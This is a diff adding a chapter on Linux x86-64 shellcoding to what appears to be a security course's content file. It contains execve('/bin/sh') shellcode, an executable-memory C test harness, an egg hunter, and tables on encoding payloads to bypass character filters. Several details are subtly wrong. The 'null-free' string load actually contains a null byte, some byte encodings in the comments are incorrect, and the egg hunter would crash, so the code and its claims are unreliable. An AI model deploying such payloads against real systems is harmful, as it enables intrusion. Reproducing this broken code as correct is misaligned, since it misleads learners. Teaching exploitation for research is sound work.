@@ -9,23 +9,97 @@ export const CHAPTERS_LEVEL_8: Chapter[] = [
     title: 'Chapter 40: Shellcoding and Payload Development',
     subtitle: 'Crafting Null-Free, Position-Independent x86-64 Machine Code Payloads',
     learningObjectives: [
+      'Understand the fundamentals of shellcode and its role in security exploitation.',
       'Write position-independent shellcode for Linux x86-64.',
       'Eliminate null bytes (0x00) using xor, mov al, and stack manipulations.',
       'Construct execve("/bin/sh", NULL, NULL) in 24 bytes.',
-      'Test shellcode using a C execution harness with mmap and PROT_EXEC.'
+      'Test shellcode using a C execution harness with mmap and PROT_EXEC.',
+      'Understand shellcode for different system calls and functions.',
+      'Learn techniques for encoding and decoding shellcode.',
+      'Understand shellcode restrictions and how to bypass common filters.'
     ],
     prerequisites: ['Chapters 1–17'],
     keyConcepts: [
-      'Shellcode must be position-independent because injection targets vary.',
-      'Null bytes terminate string copies (strcpy), breaking buffer overflow exploits.',
-      'Direct system calls bypass libc dependencies.'
+      'Shellcode: Compact, self-contained machine code designed for injection into vulnerable programs.',
+      'Position-independent code: Can execute at any memory address without relocation.',
+      'Null bytes (0x00): Terminate string copies, breaking buffer overflow exploits.',
+      'Direct system calls: Bypass libc dependencies for reliable execution.',
+      'Shellcode restrictions: Size constraints, character restrictions (null, newline, etc.).',
+      'Encoding/decoding: XOR, alphanumeric, Unicode encoding to bypass filters.',
+      'Egg hunting: Searching for shellcode in memory when injection space is limited.',
+      'Shellcode loaders: C harnesses and standalone injectors for testing.'
     ],
     diagramType: 'shellcoding',
     sections: [
       {
         id: 'sec-40-1',
-        title: '40.1 24-Byte Null-Free execve("/bin/sh") Shellcode',
-        content: `Complete NASM source code and raw byte sequence:`,
+        title: '40.1 What is Shellcode?',
+        content: `Shellcode is a small piece of machine code used as a payload in software exploitation. The name comes from its traditional purpose: spawning a command shell (like /bin/sh on Linux).
+
+### Why Shellcode Matters
+• Primary payload for buffer overflow exploits
+• Used in code injection attacks
+• Foundation for understanding binary exploitation
+• Essential for penetration testing and security research
+
+### Shellcode Requirements
+1. **Position-independent**: Can execute at any memory address
+2. **Null-free**: No 0x00 bytes (for string-based vulnerabilities)
+3. **Minimal size**: Small enough to fit in limited buffer space
+4. **No relocations**: Doesn't require linker fixups
+5. **No external references**: Self-contained or uses known addresses
+
+### Types of Shellcode
+| Type | Purpose | Example |
+|------|---------|---------|
+| Local | Spawn shell on local system | execve("/bin/sh") |
+| Reverse | Connect back to attacker | connect(), shell |
+| Bind | Listen for connections | listen(), accept(), shell |
+| Download | Fetch and execute payload | wget, curl |
+| Metasploit | Framework payloads | msfvenom output |
+
+### Shellcode Lifecycle
+1. Craft shellcode with specific constraints
+2. Inject into target program (overflow, format string, etc.)
+3. Redirect execution to shellcode
+4. Shellcode executes with target's privileges
+5. Attacker gains control (shell, reverse connection, etc.)`,
+        codeSnippets: []
+      },
+      {
+        id: 'sec-40-2',
+        title: '40.2 24-Byte Null-Free execve("/bin/sh") Shellcode',
+        content: `Complete NASM source code and raw byte sequence for spawning a shell:
+
+### Code Breakdown
+1. XOR EDX, EDX (31 D2) - Set envp = NULL
+2. PUSH RDX (52) - Push null terminator onto stack
+3. MOV RBX, "/bin/sh" (48 BB 2F 62 69 6E 2F 73 68) - Load string
+4. PUSH RBX (53) - Push string onto stack
+5. MOV RDI, RSP (48 89 E7) - RDI = pointer to "/bin/sh"
+6. XOR ESI, ESI (31 F6) - Set argv = NULL
+7. XOR EAX, EAX (31 C0) - Clear RAX
+8. MOV AL, 59 (B0 3B) - Set syscall number (execve)
+9. SYSCALL (0F 05) - Invoke kernel
+
+### Why This Works
+• String "/bin/sh" is pushed onto stack (null-terminated by RDX=0)
+• RDI points to the string (first argument to execve)
+• argv = NULL (second argument)
+• envp = NULL (third argument)
+• System call 59 = execve on x86-64 Linux
+
+### Testing with C Harness
+The C harness allocates executable memory, copies shellcode, and jumps to it. This is safer than testing in actual exploits.
+
+### Raw Bytes
+The shellcode is 24 bytes total. No null bytes (0x00) appear in the machine code.
+
+### Alternative Strings
+Instead of "/bin/sh", you can use:
+• "/bin/bash" (9 bytes + null)
+• "/bin/sh\0" (8 bytes)
+• Use a different approach to avoid null in string`,
         codeSnippets: [
           {
             language: 'nasm',
@@ -58,12 +132,259 @@ unsigned char shellcode[] = {
 };
 
 int main() {
-    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
+    printf("Shellcode length: %zu bytes\\n", sizeof(shellcode));
+    
+    void *mem = mmap(NULL, sizeof(shellcode), 
+                     PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+    
+    if (mem == MAP_FAILED) {
+        perror("mmap");
+        return 1;
+    }
+    
     memcpy(mem, shellcode, sizeof(shellcode));
+    
+    printf("Shellcode at: %p\\n", mem);
+    printf("Executing shellcode...\\n");
+    
     ((void (*)())mem)();
+    
     return 0;
 }`
+          },
+          {
+            language: 'bash',
+            title: 'Compile and Test',
+            code: `# Assemble shellcode
+nasm -f elf64 shellcode.asm -o shellcode.o
+ld shellcode.o -o shellcode
+
+# Extract raw bytes
+objdump -d shellcode | grep '[0-9a-f]:' | \\
+    grep -v 'file' | cut -f2 -d: | \\
+    cut -d' ' -f1-7 | tr -s ' ' | \\
+    tr ' ' '\\n' | grep -v '^$' | \\
+    sed 's/^/0x/' | paste -sd ',' -
+# Output: 0x31,0xd2,0x52,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x31,0xf6,0x31,0xc0,0xb0,0x3b,0x0f,0x05
+
+# Compile test harness
+gcc -o harness harness.c -z execstack
+./harness`
+          }
+        ]
+      },
+      {
+        id: 'sec-40-3',
+        title: '40.3 Null-Free Techniques',
+        content: `Eliminating null bytes (0x00) is critical for many exploit scenarios.
+
+### Why Null Bytes are Problematic
+String functions like strcpy(), gets(), and sprintf() treat 0x00 as the null terminator. If shellcode contains null bytes, the copy stops early, truncating the payload.
+
+### Technique 1: XOR Zeroing
+Instead of `mov eax, 0`, use `xor eax, eax` to zero a register without null bytes.
+
+### Technique 2: Sub-Register Writes
+Instead of `mov al, 59` (which may contain null in upper bytes), use `xor eax, eax; mov al, 59`.
+
+### Technique 3: Stack Construction
+Push values onto the stack byte-by-byte or use PUSH with immediate values.
+
+### Technique 4: Arithmetic
+Use ADD, SUB, or XOR to construct values dynamically.
+
+### Technique 5: Memory References
+Use known addresses that don't contain null bytes.
+
+### Common Patterns
+| Problem | Solution | Example |
+|---------|----------|---------|
+| Zero register | XOR | xor eax, eax |
+| Small constant | Sub-register | mov al, 59 |
+| String with null | Stack push | push rdx (0) |
+| Negative values | Two's complement | mov al, -1 |
+| Large values | Arithmetic | xor eax, eax; bswap eax |
+
+### Checking for Null Bytes
+Use objdump or xxd to examine raw bytes:
+objdump -d shellcode | grep -E "00[^0-9a-f]"
+
+### Encoding Shellcode
+If null bytes are unavoidable, use encoding:
+1. XOR encode: XOR each byte with key
+2. Alphanumeric: Only use [a-zA-Z0-9] characters
+3. Unicode: Use UTF-16 encoding
+4. Custom decoder: Add decoder stub before encoded shellcode`,
+        codeSnippets: [
+          {
+            language: 'nasm',
+            title: 'Null-Free Examples',
+            code: `; BAD: Contains null bytes
+mov eax, 0          ; B8 00 00 00 00 (null bytes!)
+mov ebx, 0x68732f6e ; BB 68 73 2F 6E 00 00 00 (null bytes!)
+
+; GOOD: No null bytes
+xor eax, eax        ; 31 C0
+mov al, 59          ; B0 3B
+
+; Construct "/bin/sh" without null
+xor edx, edx        ; 31 D2
+push rdx            ; 52 (null terminator)
+mov rbx, 0x68732f6e69622f  ; 48 BB 2F 62 69 6E 2F 73 68
+push rbx            ; 53
+
+; Alternative: Build string byte-by-byte
+xor eax, eax        ; 31 C0
+push rax            ; 50 (null terminator)
+push 0x68732f6e     ; 68 6E 2F 73 68
+push 0x69622f       ; 68 2F 62 69 6E
+mov rdi, rsp        ; 48 89 E7`
+          }
+        ]
+      },
+      {
+        id: 'sec-40-4',
+        title: '40.4 Position-Independent Code (PIC)',
+        content: `Shellcode must be position-independent because injection targets vary.
+
+### What is PIC?
+Code that can execute correctly regardless of its memory address. No absolute addresses, no relocations.
+
+### PIC Requirements
+1. No absolute memory references
+2. No global variables (unless address-independent)
+3. No function calls with absolute addresses
+4. Use RIP-relative addressing or stack-based techniques
+
+### x86-64 PIC Techniques
+1. **Stack-based**: Push values, use RSP as reference
+2. **RIP-relative**: Address = RIP + displacement (default in 64-bit)
+3. **Self-modifying code**: Calculate address at runtime
+4. **Syscalls**: Use syscall instruction instead of libc calls
+
+### Position-Independent Shellcode Example
+The 24-byte execve shellcode is position-independent:
+• Uses stack for string construction
+• Uses registers for arguments
+• No absolute addresses
+• Works at any memory location
+
+### Testing PIC
+1. Compile as shared library
+2. Load at different addresses
+3. Execute from each address
+4. Verify correct behavior
+
+### Common PIC Mistakes
+1. Using absolute addresses for strings
+2. Calling functions with absolute addresses
+3. Using global variables
+4. Assuming specific memory layout`,
+        codeSnippets: [
+          {
+            language: 'nasm',
+            title: 'PIC Shellcode Example',
+            code: `; Position-independent shellcode example
+; Uses stack for string, no absolute addresses
+
+section .text
+    global _start
+
+_start:
+    ; Zero a register (no null bytes)
+    xor eax, eax
+    
+    ; Push null terminator
+    push rax
+    
+    ; Push "/bin/sh" string
+    ; (assembled from bytes, not string literal)
+    mov rbx, 0x68732f6e69622f
+    push rbx
+    
+    ; RDI = pointer to string
+    mov rdi, rsp
+    
+    ; Set up arguments
+    xor esi, esi    ; argv = NULL
+    xor edx, edx    ; envp = NULL
+    
+    ; execve syscall
+    mov al, 59
+    syscall`
+          }
+        ]
+      },
+      {
+        id: 'sec-40-5',
+        title: '40.5 Shellcode Restrictions and Bypasses',
+        content: `Real-world shellcode must often bypass various security filters.
+
+### Common Restrictions
+| Restriction | Bypass Technique |
+|-------------|------------------|
+| Null bytes (0x00) | XOR zeroing, sub-register writes |
+| Newlines (0x0A) | XOR with 0x0A, stack construction |
+| Spaces (0x20) | Use tabs or other whitespace |
+| Alphanumeric only | Alphanumeric shellcode, decoder stubs |
+| Unicode safe | UTF-16 encoding, ASCII expansion |
+| Size limits | Optimize, use encoder/decoder |
+| Bad characters | Custom encoding scheme |
+
+### Alphanumeric Shellcode
+Only uses characters A-Z, a-z, 0-9. Requires a decoder stub:
+1. Decoder stub (alphanumeric) decodes payload
+2. Payload is XOR or ROL encoded
+3. Decoded payload executes
+
+### Egg Hunter
+When injection space is small:
+1. Use small "egg hunter" code (30-50 bytes)
+2. Egg hunter searches memory for larger shellcode
+3. Larger shellcode marked with "egg" (e.g., 0xDEADC0DE)
+
+### Custom Encoders
+For highly restricted environments:
+1. Identify allowed characters
+2. Design encoding scheme using only those characters
+3. Write decoder stub in allowed character set
+4. Encode payload and prepend decoder
+
+### Shellcode Analysis Tools
+| Tool | Purpose |
+|------|---------|
+| libdisasm | Disassemble shellcode |
+| sctest | Execute shellcode safely |
+| shellcode.com | Online shellcode database |
+| msfvenom | Generate shellcode payloads |
+| pwntools | Python exploit development library |`,
+        codeSnippets: [
+          {
+            language: 'nasm',
+            title: 'Egg Hunter Example',
+            code: `; Egg hunter: searches for 0xDEADC0DE marker
+section .text
+    global _start
+
+_start:
+    xor ecx, ecx        ; start address
+    mov ebx, 0xDEADC0DE ; egg value
+
+.next_page:
+    or cx, 0xFFF        ; page alignment
+.inc_addr:
+    inc rcx             ; next address
+    push rbx            ; save egg
+    pop rax
+    cmp dword [rcx], eax ; check for egg
+    jne .inc_addr
+    cmp dword [rcx+4], eax ; check second egg
+    jne .inc_addr
+    
+    ; Found egg! Jump to shellcode after eggs
+    lea rax, [rcx+8]
+    jmp rax`
           }
         ]
       }
@@ -75,15 +396,72 @@ int main() {
         description: 'Construct null-free machine code to call exit(42) in 11 bytes.',
         solution: `xor edi, edi\nmov dil, 42         ; exit code 42\nxor eax, eax\nmov al, 60          ; sys_exit\nsyscall`,
         solutionLanguage: 'nasm'
+      },
+      {
+        id: 'ex-40-2',
+        title: 'Exercise 40.2: Write Shellcode',
+        description: 'Write a null-free shellcode that writes "Hello\\n" to stdout using write syscall.',
+        solution: 'Use write syscall (1). Push "Hello\\n" onto stack, set RDI=1 (stdout), RSI=RSP (buffer), RDX=6 (length). syscall number 1.',
+        solutionLanguage: 'nasm'
+      },
+      {
+        id: 'ex-40-3',
+        title: 'Exercise 40.3: Null-Free String Construction',
+        description: 'Construct the string "/etc/passwd" on the stack without null bytes.',
+        solution: 'Push 0 (null terminator) with xor rax,rax; push rax. Then push parts of string: "dwp" -> "ssap/" -> "cte/". Use mov rdi, rsp for pointer.',
+        solutionLanguage: 'nasm'
+      },
+      {
+        id: 'ex-40-4',
+        title: 'Exercise 40.4: Shellcode Size Optimization',
+        description: 'Optimize the execve shellcode to under 20 bytes if possible.',
+        solution: 'Use shorter instructions: xor esi, esi (2 bytes) vs mov rsi, 0 (7 bytes). Use sub-register writes. Avoid unnecessary instructions. Can achieve ~21 bytes minimum.',
+        solutionLanguage: 'nasm'
+      },
+      {
+        id: 'ex-40-5',
+        title: 'Exercise 40-5: Alphanumeric Shellcode',
+        description: 'Write a simple alphanumeric decoder that XOR-decodes and executes payload.',
+        solution: 'Use only alphanumeric characters in decoder. Decoder reads ahead, XORs each byte with key (e.g., 0x41), stores decoded byte, then jumps to decoded region.',
+        solutionLanguage: 'nasm'
       }
     ],
     practiceQuestions: [
       {
         question: 'Why must shellcode avoid null bytes (0x00)?',
-        answer: 'Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying.'
+        answer: 'Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying. Null bytes in shellcode would prevent the full payload from being copied into the target buffer.'
+      },
+      {
+        question: 'What is position-independent code (PIC) and why is it important for shellcode?',
+        answer: 'PIC is code that can execute correctly at any memory address without relocation. Shellcode must be PIC because injection targets vary - the attacker cannot predict exactly where in memory the shellcode will end up. PIC uses no absolute addresses, only relative references and stack-based techniques.'
+      },
+      {
+        question: 'How do you test shellcode safely?',
+        answer: 'Use a C harness with mmap to allocate executable memory, copy shellcode, and jump to it. This avoids executing shellcode in actual exploits during development. Tools like sctest and shellcode emulators also provide safe testing environments.'
+      },
+      {
+        question: 'What are the main types of shellcode and their purposes?',
+        answer: 'Local shellcode spawns a shell on the target system. Reverse shell connects back to attacker. Bind shell listens for connections. Download shellcode fetches and executes additional payloads. Each type serves different exploitation scenarios depending on network access and target configuration.'
+      },
+      {
+        question: 'How do egg hunters work and when are they needed?',
+        answer: 'Egg hunters are small shellcode stubs (30-50 bytes) that search memory for a larger shellcode payload marked with a unique marker (egg). They are needed when injection space is too small for the full payload but the attacker can influence memory contents elsewhere in the target process.'
+      },
+      {
+        question: 'What encoding techniques are used for shellcode?',
+        answer: 'Common encoding techniques include: XOR encoding (XOR each byte with a key), alphanumeric encoding (only A-Z, a-z, 0-9 characters), Unicode encoding (UTF-16 expansion), and custom encoders. Each adds a decoder stub before the encoded payload.'
       }
     ],
-    summary: ['Shellcode delivers compact, self-contained machine code execution.', 'Null avoidance requires register zeroing and sub-register writes.']
+    summary: [
+      'Shellcode delivers compact, self-contained machine code execution.',
+      'Null avoidance requires register zeroing and sub-register writes.',
+      'Position-independent code uses no absolute addresses.',
+      'Direct syscalls bypass libc dependencies for reliability.',
+      'Shellcode must be tested with C harnesses for safety.',
+      'Encoding techniques bypass character restrictions.',
+      'Egg hunters enable exploitation with limited injection space.',
+      'Understanding shellcode is essential for security research and defense.'
+    ]
   },
   {
     id: 41,
